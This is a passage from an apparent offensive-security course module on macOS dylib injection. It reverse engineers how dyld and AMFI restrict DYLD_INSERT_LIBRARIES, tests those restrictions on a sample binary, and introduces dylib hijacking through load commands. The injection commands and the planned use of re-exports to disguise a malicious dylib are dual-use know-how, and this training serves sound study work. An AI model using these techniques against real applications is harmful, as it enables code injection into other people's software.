    0x1000520b0 <+8>:  sub    sp, sp, #0x40
    0x1000520b4 <+12>: stp    x20, x19, [sp, #0x20]
    0x1000520b8 <+16>: stp    x29, x30, [sp, #0x30]
Target 0: (hello) stopped.
Listing 31 - Arriving to the syscall with single steps

Single stepping onward out of the function calls, we'll reach the point where the output value is saved, it will take over 20 steps. We might recall this line from the disassembled code in which output_flags is saved at a memory location pointed by to X19.

str        x8, [x19] //save output flags
Listing 32 - Saving of amfiOutputFlags

In the debugger, the following listing shows the same exact point:

...
(lldb) step
Process 5425 stopped
* thread #1, stop reason = instruction step into
    frame #0: 0x00000001000520fc dyld`amfi_check_dyld_policy_self + 84
dyld`amfi_check_dyld_policy_self:
->  0x1000520fc <+84>: str    x8, [x19]
    0x100052100 <+88>: ldp    x29, x30, [sp, #0x30]
    0x100052104 <+92>: ldp    x20, x19, [sp, #0x20]
    0x100052108 <+96>: add    sp, sp, #0x40
Target 0: (hello) stopped.

(lldb) step
Process 5425 stopped
* thread #1, stop reason = instruction step into
    frame #0: 0x00000001000520fc dyld`amfi_check_dyld_policy_self + 88
dyld`amfi_check_dyld_policy_self:
    0x100052100 <+88>: ldp    x29, x30, [sp, #0x30]
    0x100052104 <+92>: ldp    x20, x19, [sp, #0x20]
    0x100052108 <+96>: add    sp, sp, #0x40
    0x100052108 <+100>: autibsp
Target 0: (hello) stopped.
(lldb) memory read $x19 -c 1
0x16fdff888: df 
Listing 33 - Setting of amfiOutputFlags in the debugger

At this point in the debugging, the flags are stored in the memory location pointed to by X19 and their value is 0xdf.

Let's check the flag value of 0xdf by first translating it to its binary value 1101 1111, then comparing this against amfi_dyld_policy_output_flag_set from DyldProcessConfig.cpp to determine which flags are set.

enum amfi_dyld_policy_output_flag_set
{
    AMFI_DYLD_OUTPUT_ALLOW_AT_PATH                  = (1 << 0),
    AMFI_DYLD_OUTPUT_ALLOW_PATH_VARS                = (1 << 1),
    AMFI_DYLD_OUTPUT_ALLOW_CUSTOM_SHARED_CACHE      = (1 << 2),
    AMFI_DYLD_OUTPUT_ALLOW_FALLBACK_PATHS           = (1 << 3),
    AMFI_DYLD_OUTPUT_ALLOW_PRINT_VARS               = (1 << 4),
    AMFI_DYLD_OUTPUT_ALLOW_FAILED_LIBRARY_INSERTION = (1 << 5),
    AMFI_DYLD_OUTPUT_ALLOW_LIBRARY_INTERPOSING      = (1 << 6),
    AMFI_DYLD_OUTPUT_ALLOW_EMBEDDED_VARS            = (1 << 7),
};

    const uint64_t amfiFlags = getAMFI(process, syscall);
    this->allowAtPaths              = (amfiFlags & AMFI_DYLD_OUTPUT_ALLOW_AT_PATH);
    this->allowEnvVarsPrint         = (amfiFlags & AMFI_DYLD_OUTPUT_ALLOW_PRINT_VARS);
    this->allowEnvVarsPath          = (amfiFlags & AMFI_DYLD_OUTPUT_ALLOW_PATH_VARS);
    this->allowEnvVarsSharedCache   = (amfiFlags & AMFI_DYLD_OUTPUT_ALLOW_CUSTOM_SHARED_CACHE);
    this->allowClassicFallbackPaths = (amfiFlags & AMFI_DYLD_OUTPUT_ALLOW_FALLBACK_PATHS);
    this->allowInsertFailures       = (amfiFlags & AMFI_DYLD_OUTPUT_ALLOW_FAILED_LIBRARY_INSERTION);
    this->allowInterposing          = (amfiFlags & AMFI_DYLD_OUTPUT_ALLOW_LIBRARY_INTERPOSING);
    this->allowEmbeddedVars         = (amfiFlags & AMFI_DYLD_OUTPUT_ALLOW_EMBEDDED_VARS);
Listing 34 - AMFI output flags-related code from DyldProcessConfig.cpp

This means that all allow* variables will be set to TRUE, except allowInsertFailures, which will be FALSE. We should note that allowAtPaths will become TRUE as well, since we'll examine this variable later in this Module.

If we ran the same exercise for a binary with a restricted segment, for example, we would get a result value of 0x40. This means that none of the above flags are set, thus the environment variables leveraged for injections won't be allowed.

The last piece we need to understand is what happens in the kernel. The AMFI kext can only be found in the kernel cache, thus the best way to inspect it is to install the relevant Kernel Development Kit (KDK). We will use version 14.0 build 23A344.

This can be downloaded from this GitHub link, or Apple's developer website with an account. After installing it, the file can be found at /Library/Developer/KDKs/KDK_14.0_23A344.kdk/System/Library/Extensions/AppleMobileFileIntegrity.kext/Contents/MacOS/AppleMobileFileIntegrity. We will not debug the syscall in kernel mode, and instead simply review it using Hopper for static analysis.

Before reverse engineering the binary, we need to become familiar with two structures concerning the Mandatory Access Control (MAC) registration. During MAC registration, the MAC policy module (in this case, AMFI) registers itself with the kernel by passing over its name and the various functions it implements. This information is passed with the mac_policy_conf structure, which can be found in xnu-10002.1.13/security/mac_policy.h.

struct mac_policy_conf {
	const char              *mpc_name;              /** policy name */
	const char              *mpc_fullname;          /** full name */
	char const * const *mpc_labelnames;     /** managed label namespaces */
	unsigned int             mpc_labelname_count;   /** number of managed label namespaces */
	const struct mac_policy_ops     *mpc_ops;               /** operation vector */
	int                      mpc_loadtime_flags;    /** load time flags */
	int                     *mpc_field_off;         /** label slot */
	int                      mpc_runtime_flags;     /** run time flags */
	mpc_t                    mpc_list;              /** List reference */
	void                    *mpc_data;              /** module data */
};
Listing 35 - The mac_policy_conf structure

We'll find two structure members that are interesting to us: mpc_name, which is a pointer to a string containing the policy name, and mpc_ops, which is a pointer to a mac_policy_ops structure. This structure contains several additional pointers, and it keeps increasing over time. A subset is displayed below:

...
struct mac_policy_ops {
	mpo_audit_check_postselect_t            *mpo_audit_check_postselect;
	mpo_audit_check_preselect_t             *mpo_audit_check_preselect;
...
	mpo_policy_syscall_t                    *mpo_policy_syscall;
...
};
...
Listing 36 - Part of the mac_policy_ops structure

We've highlighted the mpo_policy_syscall, since it contains the pointer to the MAC policy system call being used in our case. The mpo_policy_syscall pointer is at offset 117 from the beginning of the structure; this occurs because it's the 118th element in the structure.

Next, in Hopper, we can review the AMFI MAC registration that happens at the _amfi_register_mac_policy function call. In the following listing showing the function's code, we'll notice a call to _initializeAppleMobileFileIntegrity:

int _amfi_register_mac_policy(int arg0) {
    _initializeAppleMobileFileIntegrity();
    return 0x0;
}
Listing 37 - The amfi_register_mac_policy function

Let's inspect the _initializeAppleMobileFileIntegrity function implementation. We are specifically interested in how the previously mentioned structures are populated during registration. Unfortunately, Hopper doesn't do a good job of decompiling it at the time of this writing, so we will inspect the regular disassembly view. To get there, we will need to scroll down far.

...
000000000002fd94         pacia      x16, x17
000000000002fd98         str        x16, [x8, #0x3a0]                           ; 0x5da28
000000000002fd9c         adrp       x16, #0x33000                               ; 0x33cf8@PAGE
000000000002fda0         add        x16, x16, #0xcf8                            ; 0x33cf8@PAGEOFF, __ZL15_policy_syscallP4prociy

...

000000000002ff38         mov        x17, #0x1fb5
000000000002ff3c         pacia      x16, x17
000000000002ff40         str        x16, [x8, #0x9b8]                           ; 0x5e040
000000000002ff44         adrp       x0, #0x5e000                                ; 0x5e100@PAGE
000000000002ff48         add        x0, x0, #0x100                              ; 0x5e100@PAGEOFF, argument "mpc" for method imp___auth_stubs__mac_policy_register, __ZL10mac_policy
000000000002ff4c         adrp       x9, #0x13000                                ; 0x1317f@PAGE
000000000002ff50         add        x9, x9, #0x17f                              ; 0x1317f@PAGEOFF, "Apple Mobile File Integrity"
000000000002ff54         stp        x19, x9, [x0]
000000000002ff58         adrp       x9, #0x5e000                                ; 0x5eaf8@PAGE
000000000002ff5c         add        x9, x9, #0xaf8                              ; 0x5eaf8@PAGEOFF, __ZZL35_initializeAppleMobileFileIntegrityvE15labelnamespaces
000000000002ff60         str        x9, [x0, #0x10]                             ; 0x5e110
000000000002ff64         mov        w9, #0x1
000000000002ff68         str        w9, [x0, #0x18]                             ; 0x5e118
000000000002ff6c         str        x8, [x0, #0x20]                             ; 0x5e120
000000000002ff70         str        wzr, [x0, #0x28]                            ; 0x5e128
000000000002ff74         adrp       x8, #0x5d000                                ; 0x5d680@PAGE
000000000002ff78         add        x8, x8, #0x680                              ; 0x5d680@PAGEOFF, _amfi_mac_slot
000000000002ff7c         str        x8, [x0, #0x30]                             ; qword_value_0
000000000002ff80         str        wzr, [x0, #0x38]                            ; dword_value_0
000000000002ff84         adrp       x1, #0x5d000                                ; 0x5d67c@PAGE
000000000002ff88         add        x1, x1, #0x67c                              ; 0x5d67c@PAGEOFF, argument "handlep" for method imp___auth_stubs__mac_policy_register, __ZL16amfiPolicyHandle
000000000002ff8c         mov        x2, #0x0                                    ; argument "xd" for method imp___auth_stubs__mac_policy_register
000000000002ff90         bl         imp___auth_stubs__mac_policy_register       ; mac_policy_register

Listing 38 - The AMFI policy registration with the kernel

Reviewing the code, we can find the various structures and variables being populated for the mac_policy_register function call at the very end.

The mac_policy_ops structure is represented here as mpc at address 0x000000000002ff48. We want to know what is inserted within this structure at offset 117 of this structure; we should find the pointer to the mac_policy system call. Hopper will identify this, and we can find it at address 0x000000000002fda0.

Using this information, we can confirm that the syscall handler is implemented in policy_syscall, if we follow this system call in the pesudocode window, we observe that it receives three arguments:

void __ZL15_policy_syscallP4prociy(int arg0, int arg1, int arg2)
Listing 39 - The AMFI syscall handler function, policy_syscall

We can determine the argument types by reviewing the implementation of __mac_syscall in kernel mode, found in xnu-10002.1.13/security/mac_base.c:

/*
 * __mac_syscall: Perform a MAC policy system call
 *
 * Parameters:    p                       Process calling this routine
 *                uap                     User argument descriptor (see below)
 *                retv                    (Unused)
 *
 * Indirect:      uap->policy             Name of target MAC policy
 *                uap->call               MAC policy-specific system call to perform
 *                uap->arg                MAC policy-specific system call arguments
 *
 * Returns:        0                      Success
 *                !0                      Not success
 *
 */
int
__mac_syscall(proc_t p, struct __mac_syscall_args *uap, int *retv __unused)
{
...
	for (i = 0; i < mac_policy_list.staticmax; i++) {
		mpc = mac_policy_list.entries[i].mpc;
		if (mpc == NULL) {
			continue;
		}

		if (strcmp(mpc->mpc_name, target) == 0 &&
		    mpc->mpc_ops->mpo_policy_syscall != NULL) {
			error = mpc->mpc_ops->mpo_policy_syscall(p,
			    uap->call, uap->arg);
			goto done;
		}
	}
...
Listing 40 - Parts of __mac_syscall from mac_base.c

We'll remember that mpo_policy_syscall holds a pointer to the MAC policy syscall handler function in each MAC policy - in our case, pointing to AMFI's policy_syscall function.

Let's map mpo_policy_syscall(p,uap->call,uap->arg) to the comment section to learn about its three arguments. The first argument is the calling process, the second is the MAC policy-specific system call to perform, and the third refers to the MAC policy-specific system call arguments.

Reviewing the same function (policy_syscall) in Hopper confirms our findings.

void __ZL15_policy_syscallP4prociy(int arg0, int arg1, int arg2) {
    r2 = arg2;
    r0 = arg0;
    r31 = r31 - 0x140;
    var_40 = r26;
    stack[-72] = r25;
    var_30 = r24;
    stack[-56] = r23;
    var_20 = r22;
    stack[-40] = r21;
    var_10 = r20;
    stack[-24] = r19;
    saved_fp = r29;
    stack[-8] = r30;
    r16 = arg1 - 0x5a;
    if (r16 <= 0xc) {
            if (r16 <= 0xc) {
                    if (!CPU_FLAGS & BE) {
                            r16 = 0x0;
                    }
                    else {
                            r16 = r16;
                    }
            }
            (0x33d54 + sign_extend_64(*(int32_t *)(0x34bc4 + r16 * 0x4)))();
    }
...
Listing 41 - Part of the decompiled code of AMFI`policy_syscall function

As shown above, X16 (r16 in Hopper) takes the second argument (arg1) and subtracts 0x5a from it. arg1 is the policy-specific syscall value (~ioctl value), in our case 0x5a. Next, a jump table is used to branch based on the value in X16.

The case we are interested in is when arg1 is 0x5a, which was the value used for the AMFI check by dyld. In that case, X16 will become 0. Because of this, the value of 0x34bc4 + r16 * 0x4 will be 0x34bc4. If we look up what value is stored at that address, we find 0xc, which we need to add to 0x33d54. We get 0x33d60. This is where we jump.

void sub_33d60(int arg0, int arg1, int arg2, int arg3, int arg4, int arg5, int arg6, int arg7, int arg8, int arg9, int arg10, int arg11, int arg12, int arg13) {
    r2 = arg2;
    r1 = arg1;
    r0 = arg0;
    asm { hint       #0x24 };
    *(r24 + 0xa0) = 0x0;
    if (r20 != 0x0) {
            _check_dyld_policy_internal(r21, 0x0, r29 - 0x70);
            loc_344a8(copyout(), 0x0, 0x8);
    }
    else {
            loc_344a8(r0, r1, r2);
    }
    return;
}
Listing 42 - sub_33d60 function

If we pass a check, eventually the function will call check_dyld_policy_internal.

Digging into the check_dyld_policy_internal call, we find descriptive function names. It appears AMFI will essentially determine the flags by conducting a variety of verifications against the calling process.

int __ZL27_check_dyld_policy_internalP4procyPy(int arg0, int arg1, int arg2) {
...
    macos_dyld_policy_collect_state(arg0, arg1, &var_48);
    r0 = macos_dyld_policy_at_path(arg0, &var_48);
    r21 = r0;
    r0 = macos_dyld_policy_embedded_vars(arg0, &var_48);
    r22 = r0;
    r0 = macos_dyld_policy_env_vars(arg0, &var_48);
    r23 = r0;
    r0 = macos_dyld_policy_fallback_paths(arg0, &var_48);
    r24 = r0;
    r0 = macos_dyld_policy_library_interposing(arg0, &var_48);
    r25 = r0;
    r0 = macos_dyld_policy_development_vars(arg0, &var_48);
    r26 = r0;
    r0 = cs_require_lv();
    if (r0 != 0x0) {
            if (CPU_FLAGS & NE) {
                    r8 = 0x1;
            }
    }
    *r19 = r22 | r21 | r23 | r24 | r25 | r26 | r8 * 0x20;
    return r0;
}
Listing 43 - Part of the decompiled code of AMFI`check_dyld_policy_internal function

We will stop here for analysis, as we could easily spend a few more days simply reviewing these function calls. Essentially, what happens here is that AMFI will collect all sorts of information about the process, some code signing properties, whether it has specific entitlements or not, and pass it forward to the rest of the functions. Those functions will decide the restrictions based on the information collected.

To sum up, by analyzing the source code and debugging dyld, we determined that dyld uses AMFI to determine the process restrictions around environment variable injection on macOS.

8.1.5. Exercises
Go through the source codes and debugging, manually following the steps we did.
In the lldb debugger perform the following:

Make a breakpoint on ___sandbox_ms
Write a breakpoint action which will print out the first argument of ___sandbox_ms and continue execution. The first argument is a pointer to a string, and we would like to print the string.
Write a basic C program that leverages the discussed AMFI syscall to query the process's own restrictions and print out each setting that will be applied along with the output_flags.
8.1.6. Verifying Restrictions
Now that we've covered the theory, let's examine these restrictions in practice to find out if it will work as we expect.

Let's begin by verifying the SUID bit case. We can use our original application for this testing. First, we'll change the ownership to root and set the SUID bit.

offsec@sonoma1 ~ % sudo chown root hello

offsec@sonoma1 ~ % sudo chmod +s hello

offsec@sonoma1 ~ % ls -l hello
-rwsr-sr-x  1 root  staff  33432 Oct 24 14:36 hello
Listing 44 - Change ownership and set SUID bit

Next, we'll run the binary as normal and then try to inject our dylib.

offsec@sonoma1 ~ % ./hello 
Hello, World!

offsec@sonoma1 ~ % DYLD_INSERT_LIBRARIES=example.dylib ./hello 
Hello, World!
Listing 45 - Try injecting dylib into a binary with SUID bit set

We'll notice that, because our dylib wasn't loaded, the printf function in our dylib wasn't called.

Let's remove the SUID bit next and try our dylib injection again, but this time with success.

offsec@sonoma1 ~ % sudo chmod -s hello

offsec@sonoma1 ~ % DYLD_INSERT_LIBRARIES=example.dylib ./hello
[+] dylib constructor called from ./hello
Hello, World!
Listing 46 - Try injecting dylib into a binary after removing SUID bit

Next, let's verify that a restricted segment will also prevent the dylib from being loaded. To do this, we can compile our original hello.c code and add a restricted segment to it. The -sectcreate switch will allow us to add such a segment.

offsec@sonoma1 ~ % gcc -sectcreate __RESTRICT __restrict /dev/null hello.c -o hello-restricted
Listing 47 - Add __RESTRICT,__restrict section to hello_restricted binary

If we recompile and try to inject our dylib, we will find that it is ignored.

offsec@sonoma1 ~ % DYLD_INSERT_LIBRARIES=example.dylib ./hello-restricted           
Hello, World!
Listing 48 - Trying to inject into a binary with RESTRICTED segment

Our dylib is not loaded, which means it works as expected. We can verify that the restricted segment is present with the size command.

Caution

Homebrew may overwrite the default size application in its own path. For the best result use the application located at /usr/bin/size.

The -m switch will print the sizes of the Mach-O segments and sections, the -x switch will print those values in hex, and -l will print the offsets.

offsec@sonoma1 ~ % size -x -l -m hello-restricted
Segment __PAGEZERO: 0x100000000 (zero fill)  (vmaddr 0x0 fileoff 0)
Segment __TEXT: 0x4000 (vmaddr 0x100000000 fileoff 0)
	Section __text: 0x34 (addr 0x100003f58 offset 16216)
	Section __stubs: 0xc (addr 0x100003f8c offset 16268)
	Section __cstring: 0xf (addr 0x100003f98 offset 16280)
	Section __unwind_info: 0x58 (addr 0x100003fa8 offset 16296)
	total 0xa7
Segment __DATA_CONST: 0x4000 (vmaddr 0x100004000 fileoff 16384)
	Section __got: 0x8 (addr 0x100004000 offset 16384)
	total 0x8
Segment __RESTRICT: 0x0 (vmaddr 0x100008000 fileoff 32768)
	Section __restrict: 0x0 (addr 0x100008000 offset 32768)
	total 0x0
Segment __LINKEDIT: 0x4000 (vmaddr 0x100008000 fileoff 32768)
total 0x10000c000
Listing 49 - Verifying segments for hello-restricted

Next, we will enable the hardened runtime code-signing flag. To do this, we will need a code-signing certificate, because this is a code-signing flag, and only code-signed binaries can have such flags set. A local, self-signed certificate will be sufficient. To create one, we'll open Keychain Access and Navigate to Keychain Access > Certificate Assistant > Create a certificate. In the Name field, we can enter any name we would like. The Identity Type should be Self-Signed Root, and the Certificate Type will be Code Signing. We can press Create to finish it, then Continue and Done.


Figure 5: Creating Self-signed Certificate
Figure 5: Creating Self-signed Certificate
Now we can use this certificate for code signing. Before we sign the binary, let's make a copy of the original file and name it hello-signed. Next, we can use the codesign utility to code sign our executable.

offsec@sonoma1 ~ % cp hello hello-signed

offsec@sonoma1 ~ % codesign -s offsec --option=runtime hello-signed
Listing 50 - Codesign hello-signed binary with hardened runtime

The -s flag is used to specify the name of the certificate we created. We can use -\-option=runtime to set it to hardened runtime and finally provide codesign the name of our binary.

Let's verify the signature of our binary.

offsec@sonoma1 ~ % codesign -dv hello-signed
Executable=/Users/offsec/hello-signed
Identifier=hello-signed
Format=Mach-O thin (arm64)
CodeDirectory v=20500 size=461 flags=0x10000(runtime) hashes=9+2 location=embedded
Signature size=1644
Signed Time=Oct 25, 2023 at 17:22:58
Info.plist=not bound
TeamIdentifier=not set
Runtime Version=14.0.0
Sealed Resources=none
Internal requirements count=1 size=88
Listing 51 - Display codesigning information for hello-signed

If we try to inject our dylib now, the injection will fail, as shown:

offsec@sonoma1 ~ % DYLD_INSERT_LIBRARIES=example.dylib ./hello-signed
Hello, World!
Listing 52 - Trying to inject into hello_signed

Next, we will set the library validation (CS_REQUIRE_LV) requirement for the application using the --option=library option with the codesign command. We will also use -f to force code signing, which will replace the existing signature. Let's sign it and verify the signature again:

offsec@sonoma1 ~ % codesign -f -s offsec --option=library hello-signed
hello-signed: replacing existing signature

offsec@sonoma1 ~ % codesign -dv hello-signed
Executable=/Users/offsec/hello-signed
Identifier=hello-signed
Format=Mach-O thin (arm64)
CodeDirectory v=20400 size=453 flags=0x2000(library-validation) hashes=9+2 location=embedded
Signature size=1644
Signed Time=Oct 25, 2023 at 17:24:02
Info.plist=not bound
TeamIdentifier=not set
Sealed Resources=none
Internal requirements count=1 size=88
Listing 53 - Codesign hello_signed with library validation

Trying dylib injection at this point will fail again.

offsec@sonoma1 ~ % DYLD_INSERT_LIBRARIES=example.dylib ./hello-signed
Hello, World!
Listing 54 - Trying to inject into hello_signed

This happens because the code-signing signature of the dylib and the Mach-O file are not the same. This will be verified on every run, not just on the first run, because it's managed by AMFI and not Gatekeeper.

Info

We will cover Gatekeeper in our GateKeeper Internals (Apple Silicon) module.

If we use our self-signed certificate to sign the dylib, it still won't load, since an Apple-signed developer certificate is required.

offsec@sonoma1 ~ % cp example.dylib example-signed.dylib

offsec@sonoma1 ~ % codesign -s offsec example-signed.dylib

offsec@sonoma1 ~ % DYLD_INSERT_LIBRARIES=example-signed.dylib ./hello-signed 
Hello, World!
Listing 55 - Trying to inject into hello_signed with ad-hoc signed dylib

With library validation enabled, to inject a dylib which has the same certificate as the main Mach-O executable, we will need a proper developer certificate from Apple.

Info

This is not required for the course.

Listing 56 displays that this works by using a real developer certificate.

offsec@sonoma1 ~ % codesign -f -s "Developer ID Application: Csaba Fitzl (33YRLYRBYV)" example-signed.dylib
example-signed.dylib: replacing existing signature

offsec@sonoma1 ~ % codesign -f -s "Developer ID Application: Csaba Fitzl (33YRLYRBYV)" -—option=library hello-signed
hello-signed: replacing existing signature

offsec@sonoma1 ~ % DYLD_INSERT_LIBRARIES=example-signed.dylib ./hello-signed                               
[+] dylib constructor called from ./hello-signed
Hello, World!
Listing 56 - Resigning main executable and dylib with developer certificate

Finally, let's try setting the CS_RESTRICT code-signing flag. This is typically set dynamically during load time for Apple platform binaries by using the CS_OPS_MARKRESTRICT operation of the csops system call.

For example, checking the codesigning flags of Terminal.app, we can verify that it doesn't have any flags.

offsec@sonoma1 ~ % codesign -dv /System/Applications/Utilities/Terminal.app
Executable=/System/Applications/Utilities/Terminal.app/Contents/MacOS/Terminal
Identifier=com.apple.Terminal
Format=app bundle with Mach-O universal (x86_64 arm64e)
CodeDirectory v=20400 size=8427 flags=0x0(none) hashes=253+7 location=embedded
Platform identifier=15
Signature size=4442
Signed Time=Aug 5, 2023 at 19:38:08
Info.plist entries=38
TeamIdentifier=not set
Sealed Resources version=2 rules=2 files=0
Internal requirements count=1 size=68
Listing 57 - Verifying codesigning info of Terminal.app

We can use the CSOps utility to query the codesigning status of a process. We will need the process ID, which we can retrieve by running ps -ax. Let's do that in a new terminal.

Let's install CSOps first. To do that we need to clone the Git repo, go to the directory with the file, and compile it.

offsec@sonoma1 ~ % git clone https://github.com/axelexic/CSOps.git

offsec@sonoma1 CSOps % cd CSOps/CSOps

offsec@sonoma1 CSOps % gcc CSOps.c -o csops 
Listing 58 - Cloning csops

Here we find out the PID of the terminal application and run csops against that PID. We will also compile it before we do that.

offsec@sonoma1 CSOps % ps -ax | grep Terminal
  500 ??         1:05.95 
/System/Applications/Utilities/Terminal.app/Contents/MacOS/Terminal
 5774 ttys000    0:00.00 grep Terminal
                         

offsec@sonoma1 ~ %  CSOps % ./csops -status 500
PID: 500 -> Code Signing Status: 0x26015b11 FLAGS: ; CS_VALID ; 
CS_FORCED_LV ; CS_HARD ; CS_KILL ; CS_RESTRICT ; CS_ENFORCEMENT ; 
CS_ENTITLEMENTS_VALIDATED ; CS_RUNTIME ; CS_NO_UNTRUSTED_HELPERS ; 
CS_PLATFORM_BINARY ; CS_SIGNED 
Listing 59 - Verifying codesigning info of Terminal process with csops

Shown above, 500 is the process ID (PID) of our Terminal. The value of the code signing flags returned to us is 0x26015b11.

With this info, let's return to our original terminal and see what this flag converts to. The CS_RESTRICT flag, which is 0x800, is set in the number 0x26015b11. We can quickly verify this by performing an AND operation between the two values with a short bash one-liner.

offsec@sonoma1 ~ % echo $(([##16]0x26015b11 & 0x800))
800
Listing 60 - 0x26015b11 AND 0x800

The result of the bitwise AND operation is 0x800, thus CS_RESTRICT is set in the code signing flags. This means that the CS_RESTRICT flag is set dynamically.

Although it's not common practice, we can set this flag for our binary with --option=0x800, where 0x800 is the value of CS_RESTRICT.

offsec@sonoma1 ~ % codesign -f -s offsec --option=0x800 hello-signed
hello-signed: replacing existing signature

offsec@sonoma1 ~ % codesign -dv hello-signed                                                                      
Executable=/Users/offsec/hello-signed
Identifier=hello-signed
Format=Mach-O thin (arm64)
CodeDirectory v=20400 size=453 flags=0x800(restrict) hashes=9+2 location=embedded
Signature size=1644
Signed Time=Oct 25, 2023 at 17:48:50
Info.plist=not bound
TeamIdentifier=not set
Sealed Resources=none
Internal requirements count=1 size=88
Listing 61 - Resigning hello-signed with restricted flags

Trying to inject our dylib into this binary confirms another failure.

offsec@sonoma1 ~ % DYLD_INSERT_LIBRARIES=example.dylib ./hello-signed                                      
Hello, World!
Listing 62 - Trying to inject into a binary with restricted flags

In this section, we explored how we can leverage the DYLD_INSERT_LIBRARIES environment variable to inject a dylib into an application before its execution. We examined the restrictions of this method and analyzed Apple's source code to learn how these restrictions are implemented, covering multiple examples to confirm our understanding. We'll rely on this strong foundation of dylib injection knowledge to hone our technique later in the course.

8.1.7. Verifying Restrictions Exercises
Following the verification steps, build different binaries with different restrictions and verify whether code injection is working.

Sign the hello-signed binary with the following three codesigning flags set: hardened runtime, library validation, and restricted.

8.2. DYLIB Hijacking
This Learning Unit covers the following Learning Objectives:

Understand how a dyld loads libraries
Understand the different dyld load commands and how they work
Understand how to perform a dylib proxying attack
A second way of injecting code into a macOS application is by performing dylib hijacking or a dylib proxying attack. The idea behind this attack is very similar to DLL hijacking on Windows. It works by leveraging situations in which we can inject our own dylib when the dynamic loader (dyld) loads the application's shared libraries.

In this section, we'll examine the core elements of Patrick Wardle's 2015 study on DYLIB hijacking. We will also cover an additional method for dylib hijacking.

8.2.1. Dylib LOAD Commands
Before diving into the dylib loading process, let's review two dyld LOAD commands to help us better understand the source code. We are specifically interested in the LC_RPATH and LC_LOAD_DYLIB commands. The former contains paths to directories, and the latter contains paths to specific dylibs to be loaded. The dylib path might be prefixed with @rpath, a variable that will be resolved during execution using the paths within the LC_RPATH commands.

Let's examine an example. We will use the binary /Applications/Hopper Disassembler v4.app/Contents/MacOS/Hopper Disassembler v4.

offsec@sonoma1 ~ % otool -l "/Applications/Hopper Disassembler v4.app/Contents/MacOS/Hopper Disassembler v4" | grep -A 2 "LC_RPATH\|LC_LOAD_DYLIB"
...
--
          cmd LC_LOAD_DYLIB
      cmdsize 56
         name @rpath/libswiftCore.dylib (offset 24)
--
          cmd LC_LOAD_DYLIB
      cmdsize 64
         name @rpath/libswiftCoreGraphics.dylib (offset 24)
--
...
--
          cmd LC_RPATH
      cmdsize 32
         path /usr/lib/swift (offset 12)
--
          cmd LC_RPATH
      cmdsize 48
         path @executable_path/../Frameworks (offset 12)
Listing 63 - LOAD commands in /Applications/DB Browser for SQLite.app/Contents/MacOS/DB Browser for SQLite

As shown in Listing 63, we can find multiple LC_RPATH commands pointing to different directories, as well as LC_LOAD_DYLIB commands with an @rpath prefix. LC_LOAD_DYLIB commands always point to specific binaries.

We'll cover the meaning of these paths and variables next, learning how to leverage these commands for dylib hijacking by reviewing source code snippets from the dylib loading process.

8.2.2. Dylib Loading Process and Hijacking Scenarios
Let's start by discussing how dyld loads libraries at a high level. Along the way, we'll examine the two main scenarios in which we can conduct dylib hijacking.

We will use an earlier version of the dyld source code (832.7.1), as it's shorter and easier to understand than the newer, fully-rewritten dyld3 and dyld4. The process of dylib loading isn't different.

One of the many function calls that dyld makes when loading libraries is to the ImageLoader::recursiveLoadLibraries function. This function will obtain the various run paths of the dylibs that should be loaded and attempt to load them. It can be found in dyld-832.7.1/src/ImageLoader.cpp.

void ImageLoader::recursiveLoadLibraries(const LinkContext& context, bool preflightOnly, const RPathChain& loaderRPaths, const char* loadPath)
{
	if ( fState < dyld_image_state_dependents_mapped ) {
		// break cycles
		fState = dyld_image_state_dependents_mapped;
		
		// get list of libraries this image needs
		DependentLibraryInfo libraryInfos[fLibraryCount]; 
		this->doGetDependentLibraries(libraryInfos);
		
		// get list of rpaths that this image adds
		std::vector<const char*> rpathsFromThisImage;
		this->getRPaths(context, rpathsFromThisImage);
		const RPathChain thisRPaths(&loaderRPaths, &rpathsFromThisImage);
		
		// try to load each
		bool canUsePrelinkingInfo = true; 
...
Listing 64 - The ImageLoader::recursiveLoadLibraries function

This function finds the dylibs to be loaded by calling out to ImageLoaderMachO::doGetDependentLibraries, located in [dyld-832.7.1/src/ImageLoaderMachO.cpp](https://opensource.apple.com/source/dyld/dyld-832.7.1/src/ImageLoaderMachO.cpp.auto.html.

The ImageLoaderMachO::doGetDependentLibraries function will iterate through the Mach-O LOAD commands and build a list of dependent shared libraries. Every Mach-O file has a list of commands that is parsed by the loader, which then acts upon them. The four commands that are most important from a dylib hijacking point of view are the following:

LC_LOAD_DYLIB
LC_LOAD_WEAK_DYLIB
LC_REEXPORT_DYLIB
LC_LOAD_UPWARD_DYLIB
The LC_LOAD_DYLIB command is the generic command to load a dylib. The LC_LOAD_WEAK_DYLIB command works the same, however, if the dylib is not found, execution continues with no error returned. LC_REEXPORT_DYLIB is also used to load the specified dylibs; however, it proxies (or re-exports) the symbols from a different library, which we will leverage later in this module to legitimize a malicious dylib. LC_LOAD_UPWARD_DYLIB also loads a dylib, but is used when two libraries depend on each other (also known as an upward dependency).

We can verify how this process is implemented in the code snippet below.

void ImageLoaderMachO::doGetDependentLibraries(DependentLibraryInfo libs[])
{
...
	else {
		uint32_t index = 0;
		const uint32_t cmd_count = ((macho_header*)fMachOData)->ncmds;
		const struct load_command* const cmds = (struct load_command*)&fMachOData[sizeof(macho_header)];
		const struct load_command* cmd = cmds;
		for (uint32_t i = 0; i < cmd_count; ++i) {
			switch (cmd->cmd) {
				case LC_LOAD_DYLIB:
				case LC_LOAD_WEAK_DYLIB:
				case LC_REEXPORT_DYLIB:
				case LC_LOAD_UPWARD_DYLIB:
				{
					const struct dylib_command* dylib = (struct dylib_command*)cmd;
					DependentLibraryInfo* lib = &libs[index++];
					lib->name = (char*)cmd + dylib->dylib.name.offset;
					//lib->name = strdup((char*)cmd + dylib->dylib.name.offset);
					lib->info.checksum = dylib->dylib.timestamp;
					lib->info.minVersion = dylib->dylib.compatibility_version;
					lib->info.maxVersion = dylib->dylib.current_version;
					lib->required = (cmd->cmd != LC_LOAD_WEAK_DYLIB);
					lib->reExported = (cmd->cmd == LC_REEXPORT_DYLIB);
					lib->upward = (cmd->cmd == LC_LOAD_UPWARD_DYLIB);
				}
				break;
			}
			cmd = (const struct load_command*)(((char*)cmd)+cmd->cmdsize);
		}
	}
}
Listing 65 - The ImageLoaderMachO::doGetDependentLibraries function

When ImageLoaderMachO::doGetDependentLibraries iterates through the list of commands, if any of the four mentioned commands are found, it will add the specified library to the list of dylibs to be loaded later.

We'll also notice that some flags are being set depending upon the given load command.

lib->required = (cmd->cmd != LC_LOAD_WEAK_DYLIB);
lib->reExported = (cmd->cmd == LC_REEXPORT_DYLIB);
lib->upward = (cmd->cmd == LC_LOAD_UPWARD_DYLIB);
